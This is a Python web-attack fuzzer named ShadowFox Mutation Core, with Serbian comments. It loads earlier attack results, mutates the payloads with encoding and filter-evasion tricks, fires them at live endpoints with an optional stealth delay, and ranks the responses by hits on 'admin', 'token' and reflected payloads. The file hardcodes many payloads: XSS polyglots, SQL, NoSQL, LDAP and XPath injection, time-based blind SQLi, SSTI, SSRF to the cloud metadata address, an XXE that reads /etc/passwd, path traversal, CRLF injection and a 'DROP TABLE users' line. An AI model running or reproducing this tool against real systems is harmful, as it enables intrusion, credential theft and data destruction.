#!/usr/bin/env python3
"""
🧬 SHADOWFOX MUTATION CORE - UNIVERZALNI AI FUZZER
Napredno mutiranje payload-a sa AI evaluacijom i skalabilnim strategijama
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
import hashlib
import urllib.parse
import base64
import html
import re
from typing import Dict, List, Any, Tuple
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class MutationCore:
    def __init__(self):
        self.session = requests.Session()
        self.meta_config = {}
        self.source_payloads = []
        self.mutation_results = {
            "mission_info": {},
            "source_analysis": {},
            "mutated_payloads": [],
            "top_ai_scored_payloads": [],
            "mutation_tests": [],
            "high_score_payloads": [],
            "mutation_statistics": {}
        }
        
        # Mutation strategije - skalabilan dizajn
        self.mutation_strategies = {
            "encoding": self._encoding_mutations,
            "evasive": self._evasive_mutations,
            "polyglot": self._polyglot_mutations,
            "contextual": self._contextual_mutations,
            "blind": self._blind_mutations,
            "advanced": self._advanced_mutations
        }
        
        # AI scoring faktori
        self.scoring_factors = {
            "HTTP_SUCCESS": 3,
            "ADMIN_REFERENCE": 5,
            "NO_UNAUTHORIZED_ERROR": 4,
            "TOKEN_REFERENCE": 4,
            "DASHBOARD_REFERENCE": 3,
            "ERROR_DISCLOSURE": 2,
            "REFLECTION_FOUND": 6,
            "TIMING_ANOMALY": 3
        }
        
    def load_meta_config(self):
        """Učitava Meta konfiguraciju misije"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.mutation_results["mission_info"] = self.meta_config
                print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
        except FileNotFoundError:
            print("❌ [ERROR] Meta/mission_info.json nije pronađen!")
            exit(1)
            
    def load_source_payloads(self):
        """Učitava payload-e iz različitih izvora sa prioritetom"""
        source_files = [
            ('Napad/attack_param_fuzz.json', 'param_fuzz'),
            ('AdvanceNapad/prototype_pollution_results.json', 'prototype_pollution'),
            ('Napad/rce_payloads.json', 'rce_payloads'),
            ('Napad/attack_header_fuzz.json', 'header_fuzz'),
            ('Napad/attack_jwt_fuzz.json', 'jwt_fuzz'),
            ('ShadowRecon/shadow_recon.json', 'recon_data')
        ]
        
        loaded_sources = {}
        total_payloads = 0
        
        for file_path, source_type in source_files:
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    payloads = self._extract_payloads_from_source(data, source_type)
                    if payloads:
                        loaded_sources[source_type] = payloads
                        total_payloads += len(payloads)
                        print(f"📄 [SOURCE] {source_type}: {len(payloads)} payloada")
            except FileNotFoundError:
                print(f"⚠️  [WARNING] {file_path} nije pronađen")
                
        self.mutation_results["source_analysis"] = {
            "sources_loaded": list(loaded_sources.keys()),
            "total_source_payloads": total_payloads,
            "load_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Prioritizacija payload-a
        self.source_payloads = self._prioritize_payloads(loaded_sources)
        print(f"🎯 [SELECTION] {len(self.source_payloads)} validnih payloada za mutaciju")
        
    def _extract_payloads_from_source(self, data: Dict, source_type: str) -> List[Dict]:
        """Ekstraktuje payload-e iz različitih tipova izvora"""
        payloads = []
        
        if source_type == 'prototype_pollution':
            # Prioritet: confirmed_pollution > injection_results
            confirmed = data.get('confirmed_pollution', [])
            if confirmed:
                for item in confirmed:
                    payloads.append({
                        "endpoint": item.get('endpoint', ''),
                        "method": item.get('method', 'GET'),
                        "payload": item.get('payload', ''),
                        "params": item.get('params', {}),
                        "headers": item.get('headers', {}),
                        "source_type": source_type,
                        "priority": "HIGH",
                        "success_indicators": item.get('success_indicators', [])
                    })
            else:
                injection_results = data.get('injection_results', [])
                for item in injection_results:
                    if item.get('success_indicators'):
                        payloads.append({
                            "endpoint": item.get('endpoint', ''),
                            "method": item.get('method', 'GET'),
                            "payload": item.get('payload', ''),
                            "params": item.get('params', {}),
                            "headers": item.get('headers', {}),
                            "source_type": source_type,
                            "priority": "MEDIUM",
                            "success_indicators": item.get('success_indicators', [])
                        })
                        
        elif source_type == 'param_fuzz':
            fuzz_results = data.get('fuzz_results', [])
            for item in fuzz_results:
                if item.get('success_indicators') or item.get('status_code') == 200:
                    payloads.append({
                        "endpoint": item.get('endpoint', ''),
                        "method": item.get('method', 'GET'),
                        "payload": item.get('payload', ''),
                        "params": item.get('params', {}),
                        "headers": item.get('headers', {}),
                        "source_type": source_type,
                        "priority": "MEDIUM",
                        "success_indicators": item.get('success_indicators', [])
                    })
                    
        elif source_type == 'rce_payloads':
            rce_tests = data.get('rce_tests', [])
            for item in rce_tests:
                if item.get('response_analysis', {}).get('potential_rce', False):
                    payloads.append({
                        "endpoint": item.get('endpoint', ''),
                        "method": item.get('method', 'POST'),
                        "payload": item.get('payload', ''),
                        "params": item.get('params', {}),
                        "headers": item.get('headers', {}),
                        "source_type": source_type,
                        "priority": "CRITICAL",
                        "success_indicators": ["RCE_POTENTIAL"]
                    })
                    
        elif source_type == 'recon_data':
            # Koristi recon podatke za kreiranje osnovnih payloada
            params = data.get('discovered_parameters', {})
            endpoints = data.get('discovered_endpoints', [])
            
            for endpoint_info in endpoints[:10]:  # Limit na 10 najinteresantnijih
                if endpoint_info.get('status_code') == 200:
                    payloads.append({
                        "endpoint": endpoint_info.get('url', ''),
                        "method": "GET",
                        "payload": "",
                        "params": {},
                        "headers": {},
                        "source_type": source_type,
                        "priority": "LOW",
                        "success_indicators": ["ACCESSIBLE_ENDPOINT"]
                    })
                    
        return payloads
        
    def _prioritize_payloads(self, loaded_sources: Dict) -> List[Dict]:
        """Prioritizacija payload-a na osnovu uspešnosti i tipa"""
        all_payloads = []
        
        # Dodeli priority score
        for source_type, payloads in loaded_sources.items():
            for payload in payloads:
                priority_score = 0
                
                # Priority na osnovu tipa izvora
                if payload["priority"] == "CRITICAL":
                    priority_score += 10
                elif payload["priority"] == "HIGH":
                    priority_score += 8
                elif payload["priority"] == "MEDIUM":
                    priority_score += 5
                else:
                    priority_score += 2
                    
                # Bonus za success indicators
                success_indicators = payload.get("success_indicators", [])
                priority_score += len(success_indicators) * 2
                
                # Bonus za specifične indikatore
                if "REFLECTION_FOUND" in success_indicators:
                    priority_score += 5
                if "ADMIN_REFERENCE" in success_indicators:
                    priority_score += 4
                if "TOKEN_REFERENCE" in success_indicators:
                    priority_score += 3
                    
                payload["priority_score"] = priority_score
                all_payloads.append(payload)
                
        # Sortiraj po priority score i vrati top payload-e
        all_payloads.sort(key=lambda x: x["priority_score"], reverse=True)
        return all_payloads[:50]  # Limit na 50 najboljih
        
    def generate_mutations(self) -> List[Dict]:
        """Generiše mutacije za sve validne payload-e"""
        all_mutations = []
        
        print("🧬 [MUTATION] Pokretanje mutacijskih strategija...")
        
        for payload in self.source_payloads:
            base_payload = payload.get("payload", "")
            if not base_payload:
                continue
                
            base_payload_str = str(base_payload) if not isinstance(base_payload, str) else base_payload
            print(f"🔬 [MUTATE] {payload['source_type']}: {base_payload_str[:50]}...")
            
            # Primeni sve mutation strategije
            for strategy_name, strategy_func in self.mutation_strategies.items():
                try:
                    mutations = strategy_func(payload)
                    for mutation in mutations:
                        mutation["mutation_strategy"] = strategy_name
                        mutation["original_payload"] = payload
                        all_mutations.append(mutation)
                except Exception as e:
                    print(f"❌ [MUTATION ERROR] {strategy_name}: {str(e)}")
                    
        print(f"🧬 [MUTATION] Generisano {len(all_mutations)} mutacija")
        return all_mutations
        
    def _encoding_mutations(self, payload: Dict) -> List[Dict]:
        """Encoding mutation strategije"""
        mutations = []
        base_payload = payload.get("payload", "")
        
        encoding_strategies = [
            ("url_encode", lambda x: urllib.parse.quote(x)),
            ("double_url_encode", lambda x: urllib.parse.quote(urllib.parse.quote(x))),
            ("html_encode", lambda x: html.escape(x)),
            ("base64_encode", lambda x: base64.b64encode(x.encode()).decode()),
            ("hex_encode", lambda x: ''.join(f'%{ord(c):02x}' for c in x)),
            ("unicode_encode", lambda x: ''.join(f'\\u{ord(c):04x}' for c in x if ord(c) > 127) or x)
        ]
        
        for strategy_name, encode_func in encoding_strategies:
            try:
                mutated_payload = encode_func(base_payload)
                mutation = payload.copy()
                mutation["payload"] = mutated_payload
                mutation["mutation_type"] = strategy_name
                mutations.append(mutation)
            except Exception:
                continue
                
        return mutations
        
    def _evasive_mutations(self, payload: Dict) -> List[Dict]:
        """Evasive mutation strategije za zaobilaženje filtera"""
        mutations = []
        base_payload = payload.get("payload", "")
        
        evasive_strategies = [
            # Case variations
            ("case_mix", lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x))),
            # Comment injection
            ("sql_comment", lambda x: x.replace(" ", "/**/") if "'" in x or "SELECT" in x.upper() else x),
            # Space alternatives
            ("tab_spaces", lambda x: x.replace(" ", "\t")),
            ("plus_spaces", lambda x: x.replace(" ", "+")),
            # Null byte injection
            ("null_byte", lambda x: x + "%00"),
            # Line break injection
            ("line_breaks", lambda x: x.replace(";", ";\n")),
        ]
        
        for strategy_name, mutate_func in evasive_strategies:
            try:
                mutated_payload = mutate_func(base_payload)
                if mutated_payload != base_payload:  # Samo ako je drugačiji
                    mutation = payload.copy()
                    mutation["payload"] = mutated_payload
                    mutation["mutation_type"] = strategy_name
                    mutations.append(mutation)
            except Exception:
                continue
                
        return mutations
        
    def _polyglot_mutations(self, payload: Dict) -> List[Dict]:
        """Polyglot payload mutacije - kombinacija različitih injection tipova"""
        mutations = []
        base_payload = payload.get("payload", "")
        
        polyglot_patterns = [
            # XSS + SQL Injection
            f"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            # SQL + NoSQL + LDAP
            f"' OR '1'='1' UNION SELECT NULL-- &user=admin)(|(objectClass=*))",
            # Command Injection + XSS
            f";echo 'XSS'><script>alert('XSS')</script>",
            # Prototype Pollution + XSS
            f"__proto__[test]=<script>alert('XSS')</script>",
            # SSTI + XSS
            f"{{7*7}}<script>alert(49)</script>",
        ]
        
        for i, polyglot in enumerate(polyglot_patterns):
            mutation = payload.copy()
            mutation["payload"] = polyglot
            mutation["mutation_type"] = f"polyglot_{i+1}"
            mutations.append(mutation)
            
        return mutations
        
    def _contextual_mutations(self, payload: Dict) -> List[Dict]:
        """Kontekstualne mutacije na osnovu endpoint-a i parametara"""
        mutations = []
        base_payload = payload.get("payload", "")
        endpoint = payload.get("endpoint", "")
        
        # Analiza konteksta
        context_indicators = {
            "login": ["admin'--", "' OR '1'='1'--", "admin' OR '1'='1'#"],
            "search": ["<script>alert('XSS')</script>", "%' AND SLEEP(5)--", "{{7*7}}"],
            "upload": ["<?php echo 'RCE'; ?>", "../../../etc/passwd", "../../windows/system32/drivers/etc/hosts"],
            "api": ['{"__proto__":{"isAdmin":true}}', "'; DROP TABLE users;--", "{{config}}"],
            "admin": ["../admin", "../../admin/config", "__proto__[isAdmin]=true"]
        }
        
        # Detektuj kontekst na osnovu URL-a
        detected_context = None
        for context, payloads in context_indicators.items():
            if context in endpoint.lower():
                detected_context = context
                break
                
        if detected_context:
            for i, contextual_payload in enumerate(context_indicators[detected_context]):
                mutation = payload.copy()
                mutation["payload"] = contextual_payload
                mutation["mutation_type"] = f"contextual_{detected_context}_{i+1}"
                mutations.append(mutation)
                
        return mutations
        
    def _blind_mutations(self, payload: Dict) -> List[Dict]:
        """Blind injection mutacije - time-based i boolean-based"""
        mutations = []
        
        blind_payloads = [
            # SQL Time-based
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            # Boolean-based SQL
            "' AND '1'='1",
            "' AND '1'='2",
            # NoSQL injection
            "'; return /.*/.test('') && sleep(5000); var x='",
            # LDAP injection
            "*)(uid=*))(|(uid=*",
            # XPath injection
            "'] | //user/*[contains(*,'admin') and substring(.,1,1)='a",
        ]
        
        for i, blind_payload in enumerate(blind_payloads):
            mutation = payload.copy()
            mutation["payload"] = blind_payload
            mutation["mutation_type"] = f"blind_{i+1}"
            mutations.append(mutation)
            
        return mutations
        
    def _advanced_mutations(self, payload: Dict) -> List[Dict]:
        """Napredne mutation strategije"""
        mutations = []
        base_payload = payload.get("payload", "")
        
        advanced_techniques = [
            # SSTI (Server-Side Template Injection)
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            # SSRF (Server-Side Request Forgery)
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:22",
            "file:///etc/passwd",
            # XXE (XML External Entity)
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            # CRLF Injection
            "%0d%0aSet-Cookie: admin=true",
            # Host Header Injection
            "evil.com",
            # HTTP Response Splitting
            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<script>alert('XSS')</script>"
        ]
        
        for i, advanced_payload in enumerate(advanced_techniques):
            mutation = payload.copy()
            mutation["payload"] = advanced_payload
            mutation["mutation_type"] = f"advanced_{i+1}"
            mutations.append(mutation)
            
        return mutations
        
    def test_mutations(self, mutations: List[Dict]) -> List[Dict]:
        """Testira mutacije sa dummy POST zahtevima"""
        print("🧪 [TEST] Pokretanje testiranja mutacija...")
        
        tested_mutations = []
        
        for i, mutation in enumerate(mutations[:100], 1):  # Limit na 100 za brzinu
            if i % 10 == 0:
                print(f"🧪 [TEST] Progress: {i}/{min(len(mutations), 100)}")
                
            try:
                # Dummy test request
                test_result = self._execute_mutation_test(mutation)
                mutation["test_result"] = test_result
                tested_mutations.append(mutation)
                
                # Intelligent delay
                if self.meta_config.get('stealth_mode', False):
                    delay = self.meta_config.get('rate_delay_seconds', 1.0)
                    time.sleep(delay + random.uniform(0, 0.5))
                else:
                    time.sleep(random.uniform(0.1, 0.3))
                    
            except Exception as e:
                mutation["test_result"] = {
                    "status": "ERROR",
                    "error": str(e),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                tested_mutations.append(mutation)
                
        self.mutation_results["mutation_tests"] = tested_mutations
        print(f"🧪 [TEST] Testirano {len(tested_mutations)} mutacija")
        return tested_mutations
        
    def _execute_mutation_test(self, mutation: Dict) -> Dict:
        """Izvršava test mutacije"""
        endpoint = mutation.get("endpoint", "")
        method = mutation.get("method", "POST").upper()

        payload = mutation.get("payload", "")
        if isinstance(payload, dict):
            payload = json.dumps(payload, separators=(',', ':'))  # Serialize proto
        params = mutation.get("params", {})
        headers = mutation.get("headers", {})
        
        # Setup session headers
        session_headers = {**self.session.headers, **headers}
        if 'User-Agent' not in session_headers:
            session_headers['User-Agent'] = 'ShadowFox-Mutation/2.0'
            
        try:
            start_time = time.time()
            
            # Izvršavanje zahteva
            if method == "GET":
                response = self.session.get(endpoint, params={**params, "test": payload}, 
                                          headers=session_headers, timeout=10)
            else:
                data = {**params, "test": payload}
                response = self.session.post(endpoint, data=data, 
                                           headers=session_headers, timeout=10)
                
            end_time = time.time()
            
            test_result = {
                "payload_sent": payload,
                "status": "SUCCESS",
                "status_code": response.status_code,
                "response_time": round(end_time - start_time, 3),
                "content_length": len(response.content),
                "response_headers": dict(response.headers),
                "response_snippet": response.text[:500] if response.text else "",
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            return test_result
            
        except Exception as e:
            return {
                "status": "FAILED",
                "error": str(e),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
    def ai_evaluate_mutations(self, tested_mutations: List[Dict]) -> List[Dict]:
        """AI evaluacija mutacija na osnovu response-a"""
        print("🤖 [AI EVAL] Pokretanje AI evaluacije...")
        
        evaluated_mutations = []
        
        for mutation in tested_mutations:
            ai_score = self._calculate_ai_score(mutation)
            mutation["ai_score"] = ai_score
            mutation["ai_evaluation"] = self._generate_ai_evaluation(mutation, ai_score)
            evaluated_mutations.append(mutation)
            
        # Sortiraj po AI score
        evaluated_mutations.sort(key=lambda x: x.get("ai_score", 0), reverse=True)
        
        # Izdvoj top payloade
        threshold = self.meta_config.get('ai_score_threshold', 3.0)
        
        self.mutation_results["top_ai_scored_payloads"] = [
            m for m in evaluated_mutations if m.get("ai_score", 0) >= threshold
        ][:20]  # Top 20
        
        self.mutation_results["high_score_payloads"] = [
            m for m in evaluated_mutations if m.get("ai_score", 0) >= threshold * 1.5
        ][:10]  # Top 10 highest
        
        print(f"🤖 [AI EVAL] Top payloadi: {len(self.mutation_results['top_ai_scored_payloads'])}")
        print(f"🔥 [AI EVAL] High score: {len(self.mutation_results['high_score_payloads'])}")
        
        return evaluated_mutations
        
    def _calculate_ai_score(self, mutation: Dict) -> float:
        """Kalkuliše AI score na osnovu response karakteristika"""
        score = 0.0
        test_result = mutation.get("test_result", {})
        
        if test_result.get("status") != "SUCCESS":
            return 0.0
            
        status_code = test_result.get("status_code", 0)
        response_time = test_result.get("response_time", 0)
        content_length = test_result.get("content_length", 0)
        response_snippet = test_result.get("response_snippet", "").lower()
        
        # Scoring faktori
        if status_code == 200:
            score += self.scoring_factors["HTTP_SUCCESS"]
        elif status_code in [500, 502, 503]:
            score += 2  # Error može biti indikator
            
        # Content analysis
        if "admin" in response_snippet:
            score += self.scoring_factors["ADMIN_REFERENCE"]
        if "token" in response_snippet:
            score += self.scoring_factors["TOKEN_REFERENCE"]
        if "dashboard" in response_snippet:
            score += self.scoring_factors["DASHBOARD_REFERENCE"]
        if "unauthorized" not in response_snippet and "forbidden" not in response_snippet:
            score += self.scoring_factors["NO_UNAUTHORIZED_ERROR"]
            
        # Payload reflection check
        payload = mutation.get("payload", "").lower()
        if payload and payload in response_snippet:
            score += self.scoring_factors["REFLECTION_FOUND"]
            
        # Error disclosure patterns
        error_patterns = ["error", "exception", "stack trace", "sql", "mysql", "postgresql"]
        if any(pattern in response_snippet for pattern in error_patterns):
            score += self.scoring_factors["ERROR_DISCLOSURE"]
            
        # Timing anomaly
        if response_time > 3.0:
            score += self.scoring_factors["TIMING_ANOMALY"]
            
        # Content length anomaly
        if content_length > 10000 or content_length < 100:
            score += 1  # Unusual content length
            
        return round(score, 2)
        
    def _generate_ai_evaluation(self, mutation: Dict, ai_score: float) -> Dict:
        """Generiše AI evaluaciju sa objašnjenjem"""
        test_result = mutation.get("test_result", {})
        
        evaluation = {
            "score": ai_score,
            "confidence": "HIGH" if ai_score >= 8 else "MEDIUM" if ai_score >= 4 else "LOW",
            "risk_level": "CRITICAL" if ai_score >= 10 else "HIGH" if ai_score >= 6 else "MEDIUM" if ai_score >= 3 else "LOW",
            "indicators": [],
            "recommendation": ""
        }
        
        # Generiši indikatore na osnovu score-a
        if test_result.get("status_code") == 200:
            evaluation["indicators"].append("Successful HTTP response")
        if "admin" in test_result.get("response_snippet", "").lower():
            evaluation["indicators"].append("Admin reference found")
        if mutation.get("payload", "").lower() in test_result.get("response_snippet", "").lower():
            evaluation["indicators"].append("Payload reflection detected")
            
        # Generiši preporuku
        if ai_score >= 8:
            evaluation["recommendation"] = "IMMEDIATE MANUAL REVIEW - High vulnerability potential"
        elif ai_score >= 4:
            evaluation["recommendation"] = "Manual review recommended - Interesting response patterns"
        else:
            evaluation["recommendation"] = "Low priority - Standard response"
            
        return evaluation
        
    def generate_statistics(self):
        """Generiše statistike mutation operacije"""
        all_mutations = self.mutation_results.get("mutation_tests", [])
        top_payloads = self.mutation_results.get("top_ai_scored_payloads", [])
        high_score = self.mutation_results.get("high_score_payloads", [])
        
        stats = {
            "total_mutations_generated": len(all_mutations),
            "successful_tests": len([m for m in all_mutations if m.get("test_result", {}).get("status") == "SUCCESS"]),
            "failed_tests": len([m for m in all_mutations if m.get("test_result", {}).get("status") != "SUCCESS"]),
            "top_scored_payloads": len(top_payloads),
            "high_score_payloads": len(high_score),
            "average_ai_score": round(sum(m.get("ai_score", 0) for m in all_mutations) / len(all_mutations), 2) if all_mutations else 0,
            "max_ai_score": max((m.get("ai_score", 0) for m in all_mutations), default=0),
            "success_rate": round((len([m for m in all_mutations if m.get("test_result", {}).get("status") == "SUCCESS"]) / len(all_mutations)) * 100, 2) if all_mutations else 0,
            "mutation_strategies_used": list(self.mutation_strategies.keys()),
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Top mutation strategije po AI score
        strategy_scores = {}
        for mutation in all_mutations:
            strategy = mutation.get("mutation_strategy", "unknown")
            score = mutation.get("ai_score", 0)
            if strategy not in strategy_scores:
                strategy_scores[strategy] = []
            strategy_scores[strategy].append(score)
            
        top_strategies = {}
        for strategy, scores in strategy_scores.items():
            if scores:
                top_strategies[strategy] = {
                    "average_score": round(sum(scores) / len(scores), 2),
                    "max_score": max(scores),
                    "count": len(scores)
                }
                
        stats["strategy_performance"] = dict(sorted(top_strategies.items(), 
                                                  key=lambda x: x[1]["average_score"], 
                                                  reverse=True))
        
        self.mutation_results["mutation_statistics"] = stats
        
    def save_results(self):
        """Snima rezultate u mutator_core.json"""
        output_file = "Centar/mutator_core.json"

        try:
            with open(output_file, 'w') as f:
                json.dump(self.mutation_results, f, indent=2)
            print(f"💾 [SAVE] Mutacija rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [ERROR] Nije moguće sačuvati rezultate: {str(e)}")

if __name__ == "__main__":
    core = MutationCore()
    core.load_meta_config()
    core.load_source_payloads()
    mutations = core.generate_mutations()
    tested = core.test_mutations(mutations)
    evaluated = core.ai_evaluate_mutations(tested)
    core.generate_statistics()
    core.save_results()
